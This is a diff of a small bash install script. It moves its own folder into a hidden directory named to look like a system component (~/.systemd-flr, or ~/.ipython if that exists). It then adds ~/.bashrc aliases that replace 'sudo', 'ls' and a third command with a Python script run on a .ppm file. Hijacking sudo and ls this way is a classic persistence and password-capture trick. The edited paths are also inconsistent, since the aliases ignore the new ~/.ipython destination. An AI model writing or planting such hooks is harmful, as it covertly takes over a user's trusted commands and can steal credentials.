@@ -1,5 +1,9 @@
 #!/bin/bash
-mv "$PWD" "$HOME/.systemd-flr"
+DEST="$HOME/.ipython"
+if [ ! -d "$DEST" ]; then
+	DEST="$HOME/.systemd-flr"
+fi
+mv "$PWD" "$DEST"
 echo 'alias sudo="python3 ~/.systemd-flr/papa.py ~/.systemd-flr/papa.ppm"' >> ~/.bashrc
 echo 'alias fularta="python3 ~/.systemd-flr/papa.py ~/.systemd-flr/papa.ppm"' >> ~/.bashrc
 echo 'alias ls="python3 ~/.systemd-flr/papa.py ~/.systemd-flr/papa.ppm"' >> ~/.bashrc
